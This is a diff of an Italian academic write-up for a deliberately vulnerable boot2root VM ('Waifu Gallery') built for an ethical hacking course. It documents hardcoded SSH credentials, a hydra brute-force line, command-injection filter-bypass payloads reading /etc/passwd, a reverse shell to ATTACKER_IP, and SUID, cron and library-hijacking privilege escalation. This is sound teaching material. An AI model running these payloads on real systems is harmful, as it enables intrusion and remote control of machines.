@@ -1730,32 +1730,29 @@
 <h1 id="boot2root-vm-design-waifu-gallery-artificial-vulnerability-orchestration">Boot2Root VM Design: Waifu Gallery – Artificial Vulnerability Orchestration<a class="headerlink" href="#boot2root-vm-design-waifu-gallery-artificial-vulnerability-orchestration" title="Permanent link">&para;</a></h1>
 <h2 id="progetto-accademico-progettazione-e-implementazione-di-un-ambiente-vulnerabile-controllato">Progetto Accademico: Progettazione e Implementazione di un Ambiente Vulnerabile Controllato<a class="headerlink" href="#progetto-accademico-progettazione-e-implementazione-di-un-ambiente-vulnerabile-controllato" title="Permanent link">&para;</a></h2>
 <p><strong>Contexto del Progetto:</strong>
-- <strong>Ateneo:</strong> Sapienza Università di Roma, Dipartimento di Cybersecurity
+- <strong>Ateneo:</strong> Sapienza Università di Roma, Corso di Laurea Magistrale in Cybersecurity
 - <strong>Corso:</strong> Ethical Hacking &amp; Penetration Testing (A.A. 2023/24)
-- <strong>Ruolo:</strong> Lead Architect &amp; Full-Stack Developer (6 vulnerabilità, 3 livelli di difficoltà)
 - <strong>Target:</strong> Progettazione di una macchina virtuale vulnerabile destinata a simulazioni didattiche in ambiente d'esame
 - <strong>Deliverable:</strong> VM Linux funzionante + Report tecnico ufficiale + Codice sorgente</p>
-<p><strong>Perché questo progetto è rilevante per la cybersecurity:</strong>
-Gli studenti non dovevano solo trovare vulnerabilità: dovevano capire come combinarle, seguendo il path footprint → access → privilege escalation.</p>
 <p><strong>Tecnologie &amp; Stack:</strong>
 - <strong>Sistema Operativo:</strong> Ubuntu 20.04.6 LTS
 - <strong>Web Stack:</strong> Apache2 + PHP
 - <strong>Backend Logic:</strong> Bash scripting, C (compilazione di exploit)
 - <strong>Vulnerabilità Implementate:</strong> 6 distinte (3 Access Vectors, 3 Privilege Escalation), livelli Easy/Medium/Hard
-- <strong>Infrastructure:</strong> Git versioning per tracking di design decisions</p>
+- <strong>Infrastructure:</strong> Git versioning per tracking</p>
 <hr />
 <h2 id="1-concept-architettura-del-sistema">1. Concept &amp; Architettura del Sistema<a class="headerlink" href="#1-concept-architettura-del-sistema" title="Permanent link">&para;</a></h2>
 <h3 id="11-come-labbiamo-pensata">1.1 Come l'Abbiamo Pensata<a class="headerlink" href="#11-come-labbiamo-pensata" title="Permanent link">&para;</a></h3>
-<p>Abbiamo deciso di non fare il solito "Linux VM con 6 flag nascosti" banale. Volevamo qualcosa che:</p>
+<p>La VM doveva essere basata su un vero e plausibile server, quindi era necessario che:</p>
 <ol>
-<li><strong>Fosse realistica</strong> – Una web gallery è qualcosa che studenti hanno veramente visto online, non un ambiente astratto</li>
-<li><strong>Avesse una trama</strong> – Il tema anime non è casuale: il prof ama gli anime, quindi è venuto naturale. Ma importante: gli hint sono nella UI (tooltip sulle immagini), quindi per trovarli serve fare OSINT sul sito, non leggere il codice</li>
-<li><strong>Fosse progressivo</strong> – Easy vulnerabilità per capire il flusso, Medium per imparare il bypass che funziona, Hard per chi ha capito bene</li>
+<li><strong>Fosse realistica</strong> – Abbiamo deciso di ispirarci ad una web gallery di inizio 2000, poiché sembrava una soluzione ottimale per avere una tipologia di web app conosciuta e non eccessivamente complessa.</li>
+<li><strong>Avesse una trama</strong> – Il tema anime è stato pensato sapendo che il prof. fosse un appassionato: inoltre, vi è una sorta di narrazione interna con vari easter egg ed indizi nascosti.</li>
+<li><strong>Fosse progressivo</strong> – Vulnerabilità Easy per capire il flow, Medium per imparare il bypass per l'RCE, Hard per aver fatto una corretta enumerazione e bypass filtro per LFI.</li>
 </ol>
 <p><strong>La Scelta: Waifu Gallery</strong>
-Una galleria di personaggi anime di metà 2000. Perché? Perché è credibile (quegli anni c'erano), è un web service che effettivamente è stata una cosa, e gli studenti sapevano già di cosa parlavamo. Non ti devi spiegare "cosa è una gallery", sai già che è un sito dove scrolli immagini.</p>
+Una board di personaggi anime dagli anni '90 a metà 2000. Perché? Perché è credibile, è un web service che effettivamente è stata una cosa e continuano ad esistere ed essere frequentati, gli studenti sapevano già di cosa parlavamo e non vi era un'eccessiva macchinosità del servizio che avrebbe causato rallentamenti del flow inutili. </p>
 <h3 id="12-architettura-dove-abbiamo-messo-cosa">1.2 Architettura: Dove Abbiamo Messo Cosa<a class="headerlink" href="#12-architettura-dove-abbiamo-messo-cosa" title="Permanent link">&para;</a></h3>
-<p>Ogni vulnerabilità doveva stare in un posto specifico del sistema. Così l'attaccante doveva muoversi in ordine:</p>
+<p>Ogni vulnerabilità doveva stare in un posto specifico del sistema, in modo da favorire un'esplorazione da parte dell'attaccante:</p>
 <table>
 <thead>
 <tr>
@@ -1832,7 +1829,7 @@ Una galleria di personaggi anime di metà 2000. Perché? Perché è credibile (q
 <tr>
 <td><strong>3.2</strong></td>
 <td>Web Command Injection</td>
-<td>Lateral Escalation</td>
+<td>RCE</td>
 <td>⭐⭐ MEDIUM</td>
 <td>Accesso a web app (default)</td>
 <td>RCE come www-data user</td>
@@ -1840,7 +1837,7 @@ Una galleria di personaggi anime di metà 2000. Perché? Perché è credibile (q
 <tr>
 <td><strong>3.3</strong></td>
 <td>File Upload + Shell Execution</td>
-<td>RCE</td>
+<td>LFI</td>
 <td>⭐⭐⭐ HARD</td>
 <td>Riconoscimento pagina nascosta + upload bypass + esecuzione</td>
 <td>Shell www-data + persistent backdoor</td>
@@ -1872,32 +1869,32 @@ Una galleria di personaggi anime di metà 2000. Perché? Perché è credibile (q
 </tbody>
 </table>
 <h3 id="22-attack-chain-visualization">2.2 Attack Chain Visualization<a class="headerlink" href="#22-attack-chain-visualization" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────┐
-│ INITIAL ACCESS                                          │
-│ ├─ [3.1] SSH brute-force (amogus:sus1)      ← Easiest  │
-│ └─ [3.1] HTTP Reconnaissance → UI hints               │
-└────────────────────┬────────────────────────────────────┘
+<div class="highlight"><pre><span></span><code>┌────────────────────────────────────────────────────────┐
+│ INITIAL ACCESS                                         │
+│ ├─ [3.1] SSH brute-force (amogus:sus1)     ← Easiest   │
+│ └─ [3.1] HTTP Reconnaissance → UI hints                │
+└────────────────────┬───────────────────────────────────┘
                      │
                      ▼
-┌─────────────────────────────────────────────────────────┐
-│ LATERAL MOVEMENT / WEB RCE                              │
+┌────────────────────────────────────────────────────────┐
+│ LATERAL MOVEMENT / WEB RCE                             │
 │ ├─ [3.2] Command Injection via search bar  ← Via ;;##  │
 │ │         shell_exec() bypass                          │
-│ └─ [3.3] Hidden upload page (imposter.php)            │
+│ └─ [3.3] Hidden upload page (imposter.php)             │
 │          shell.php.jpg double extension bypass         │
-└────────────────────┬────────────────────────────────────┘
+└────────────────────┬───────────────────────────────────┘
                      │
                      ▼
-┌─────────────────────────────────────────────────────────┐
-│ PRIVILEGE ESCALATION (Choose One)                       │
-│ ├─ [4.1] SUID hping3 → /bin/sh -p         ← Simplest   │
+┌────────────────────────────────────────────────────────┐
+│ PRIVILEGE ESCALATION (Choose One)                      │
+│ ├─ [4.1] SUID hping3 → /bin/sh -p          ← Easy      │
 │ ├─ [4.2] Cronjob PATH manipulation                     │
-│ └─ [4.3] LD_LIBRARY_PATH hijacking        ← Complex    │
-└─────────────────────────────────────────────────────────┘
+│ └─ [4.3] LD_LIBRARY_PATH hijacking         ← Hard      │
+└────────────────────────────────────────────────────────┘
 </code></pre></div>
 <p><strong>Chiave Didattica:</strong>
 Ogni livello dimostra concetti reali riscontrati in engagement professionali:
-- <strong>Easy:</strong> Reconnaissance basica + weak credentials (es. Spring4Shell, ProxyLogon preliminary phases)
+- <strong>Easy:</strong> Reconnaissance basica + weak credentials + OSINT
 - <strong>Medium:</strong> Sanitizzazione insufficiente + misunderstanding di shell metacharacters
 - <strong>Hard:</strong> Understanding profondo di ELF loader + exploitation of complex privilege boundaries</p>
 <hr />
@@ -1906,37 +1903,39 @@ Ogni livello dimostra concetti reali riscontrati in engagement professionali:
 <h3 id="31-weak-ssh-credentials-easy-mode">3.1 Weak SSH Credentials – Easy Mode<a class="headerlink" href="#31-weak-ssh-credentials-easy-mode" title="Permanent link">&para;</a></h3>
 <h4 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h4>
 <p>L'utente <code>amogus</code> con password <code>sus1</code> è il primo indizio. Il nome è un riferimento ad Among Us (il gioco), che all'epoca era famoso nei nostri gruppi di studio. Sapevamo che gli altri studenti lo avrebbero riconosciuto.</p>
-<p>La password non è nella UI da nessuna parte, ma il nome sì: se apri il DevTools e ispezioni una qualunque immagine della gallery, vedi:
+<p>La password non è nella UI da nessuna parte, ma il nome sì: aprendo il DevTool randomicamente una delle immagini sarà come segue:
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;...&quot;</span> <span class="na">title</span><span class="o">=</span><span class="s">&quot;amogus&quot;</span> <span class="err">...</span><span class="p">&gt;</span>
 </code></pre></div></p>
+<p>Inoltre, è presente un indizio visivo nascosto nella home page: viene scelta randomicamente un'immgine nella griglia tra le ultime righe, facendo hovering del puntatore, apparirà in trasparenza l'Ascii art di <em>Among Us</em>. L'indizio è stato messo per premiare la ricerca immagine per immagine, essendo inoltre la sua posizione randomica. </p>
 <p>Quindi per risolvere questa vulnerabilità serve:
 1. Osservare la UI (aprire inspector del browser)
 2. Identificare il titolo nascosto
 3. Tentare brute-force su SSH con quel nome</p>
 <h4 id="lexploit">L'Exploit<a class="headerlink" href="#lexploit" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><span class="c1"># Reconnaissance: passa il mouse su un&#39;immagine, vedi il tooltip</span>
+<p><div class="highlight"><pre><span></span><code><span class="c1"># Reconnaissance: passa il mouse su un&#39;immagine, vedi il tooltip</span>
 <span class="c1"># Oppure F12 → Inspector, cerca title attribute</span>
 
-<span class="c1"># Brute-force SSH</span>
+<span class="c1"># Brute-force SSH (o dictionary per soluzione quasi istantanea)</span>
 hydra<span class="w"> </span>-l<span class="w"> </span>amogus<span class="w"> </span>-P<span class="w"> </span>wordlist.txt<span class="w"> </span>ssh://&lt;vm_ip&gt;
-<span class="c1"># Oppure: ssh amogus@&lt;vm_ip&gt; con password &quot;sus1&quot;</span>
+<span class="c1"># In seguito: ssh amogus@&lt;vm_ip&gt; con password &quot;sus1&quot;</span>
 </code></pre></div>
-<p>È Easy perché non c'è logica nascosta: il nome è visibile in UI, la password è banale. L'unico sforzo è capire che vai su SSH, non sul web app.</p>
+vai s
+È Easy perché non c'è logica nascosta: il nome è visibile in UI, la password è banale. L'unico "sforzo" è capire che devi usare SSH, anche perché nella web app non ci sono moduli di login o altro. Inoltre, <em>sus</em> è il termine più connesso ad <em>amogus</em>, quindi la creazione della wordlist è molto rapida.</p>
 <h3 id="32-web-command-injection-medium-mode">3.2 Web Command Injection – Medium Mode<a class="headerlink" href="#32-web-command-injection-medium-mode" title="Permanent link">&para;</a></h3>
 <h4 id="la-vulnerabilita">La Vulnerabilità<a class="headerlink" href="#la-vulnerabilita" title="Permanent link">&para;</a></h4>
-<p>La search bar fa ricerca di immagini con <code>shell_exec("ls $image_folder$query*.jpg")</code>.Il filtro era blacklist-based: blocca bash, nc, wget, comandi specifici. Però abbiamo volutamente lasciato un buco.</p>
-<p>Se usi <code>;</code> o <code>#</code> direttamente, viene bloccato. MA se usi <code>;;</code> e <code>##</code>, il filtro le riconosce come "doppi" e le permette. Poi c'è un <code>str_replace()</code> che li converte in singoli:
+<p>La search bar fa ricerca di immagini con <code>shell_exec("ls $image_folder$query*.jpg")</code>.Il filtro era blacklist-based: blocca <code>bash</code>, <code>nc</code>, <code>wget</code>, comandi specifici. Però abbiamo volutamente lasciato un buco.</p>
+<p>Se usi <code>;</code> o <code>#</code> direttamente, questi vengono bloccati. MA se usi <code>;;</code> o <code>##</code>, il filtro riconosce solo il primo tralasciando il secondo carattere permettendo l'injection del codice. Poi c'è un <code>str_replace()</code> che li converte in singoli (inserito per comodità nell'esecuzione del RCE, senza creare difficoltà artificiale):
 <div class="highlight"><pre><span></span><code><span class="x">if (strpos($query, &quot;;;&quot;) !== false &amp;&amp; strpos($query, &quot;##&quot;) !== false) {</span>
 <span class="x">    $query = str_replace(&quot;;;&quot;, &quot;;&quot;, $query);    // ;; -&gt; ;</span>
 <span class="x">    $query = str_replace(&quot;##&quot;, &quot;#&quot;, $query);    // ## -&gt; #</span>
 <span class="x">}</span>
 </code></pre></div></p>
-<p>Il problema: il controllo PRIMA della sostituzione. Quindi <code>;;ls /##</code> passa il filtro perché <code>;;</code> non è <code>;</code>, non viene bloccato.</p>
+<p>Il controllo avviene PRIMA della sostituzione. Quindi <code>;;ls /##</code> passa il filtro perché <code>;;</code> non è <code>;</code>, non viene bloccato. Fosse stato effettuato DOPO, sarebbe stato bloccato, cosa che avviene per tutte le altre tipologie di injection.</p>
 <h4 id="come-risolverla">Come Risolverla<a class="headerlink" href="#come-risolverla" title="Permanent link">&para;</a></h4>
 <div class="highlight"><pre><span></span><code><span class="c1"># Payload diretti</span>
-<span class="p">;;</span>ls<span class="w"> </span>/##<span class="w">            </span><span class="c1"># Elenca root directory</span>
+<span class="p">;;</span>ls<span class="w"> </span>/##<span class="w">             </span><span class="c1"># Elenca root directory</span>
 <span class="p">;;</span>cat<span class="w"> </span>/etc/passwd##<span class="w">  </span><span class="c1"># Legge file sensibili</span>
-<span class="p">;;</span>whoami##<span class="w">          </span><span class="c1"># Vedi chi sei</span>
+<span class="p">;;</span>whoami##<span class="w">           </span><span class="c1"># Vedi chi sei</span>
 
 <span class="c1"># Payload più complessi (reverse shell):</span>
 <span class="p">;;</span>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/ATTACKER_IP/7777<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="c1">##</span>
@@ -2005,8 +2004,7 @@ root
 <div class="highlight"><pre><span></span><code><span class="c1"># Remove SUID</span>
 chmod<span class="w"> </span>-s<span class="w"> </span>/usr/sbin/hping3
 
-<span class="c1"># Oppure usare sudo con logging:</span>
-<span class="c1"># sudoers: amogus ALL=(root) NOPASSWD: /usr/sbin/hping3</span>
+<span class="c1"># Oppure usare sudo con logging</span>
 </code></pre></div>
 <h3 id="42-cronjob-path-hijacking-medium">4.2 Cronjob PATH Hijacking – Medium<a class="headerlink" href="#42-cronjob-path-hijacking-medium" title="Permanent link">&para;</a></h3>
 <h4 id="come-funziona">Come Funziona<a class="headerlink" href="#come-funziona" title="Permanent link">&para;</a></h4>
@@ -2083,11 +2081,11 @@ SHELL=/bin/bash
 </code></pre></div></p>
 <h3 id="43-ldso-hijacking-hard">4.3 LD.SO Hijacking – Hard<a class="headerlink" href="#43-ldso-hijacking-hard" title="Permanent link">&para;</a></h3>
 <h4 id="come-funziona-lelf-loader">Come Funziona L'ELF Loader<a class="headerlink" href="#come-funziona-lelf-loader" title="Permanent link">&para;</a></h4>
-<p>L'ELF loader (<code>ld.so</code>) risolve le librerie dinamiche che un programma ha bisogno al runtime. Segue un ordine di ricerca specifico:</p>
-<div class="highlight"><pre><span></span><code>1. LD_LIBRARY_PATH (variabile ambiente)
-2. /etc/ld.so.cache (cache compilata)
-3. /etc/ld.so.conf e /etc/ld.so.conf.d/ (config di sistema)
-4. Standard dirs: /lib, /usr/lib, /lib64, /usr/lib64
+<p>L'ELF loader (<code>ld.so</code>) risolve le librerie dinamiche che un programma necessita a runtime. Segue un ordine di ricerca specifico:</p>
+<div class="highlight"><pre><span></span><code><span class="m">1</span>.<span class="w"> </span>LD_LIBRARY_PATH<span class="w"> </span><span class="o">(</span>variabile<span class="w"> </span>ambiente<span class="o">)</span>
+<span class="m">2</span>.<span class="w"> </span>/etc/ld.so.cache<span class="w"> </span><span class="o">(</span>cache<span class="w"> </span>compilata<span class="o">)</span>
+<span class="m">3</span>.<span class="w"> </span>/etc/ld.so.conf<span class="w"> </span>e<span class="w"> </span>/etc/ld.so.conf.d/<span class="w"> </span><span class="o">(</span>config<span class="w"> </span>di<span class="w"> </span>sistema<span class="o">)</span>
+<span class="m">4</span>.<span class="w"> </span>Standard<span class="w"> </span>dirs:<span class="w"> </span>/lib,<span class="w"> </span>/usr/lib,<span class="w"> </span>/lib64,<span class="w"> </span>/usr/lib64
 </code></pre></div>
 <p>Se un binary SUID cerca una libreria in una directory <strong>scrivibile</strong>, possiamo mettere lì la nostra versione malware e il binary SUID la carica.</p>
 <h4 id="discovery-finding-the-vulnerable-binary">Discovery: Finding the Vulnerable Binary<a class="headerlink" href="#discovery-finding-the-vulnerable-binary" title="Permanent link">&para;</a></h4>
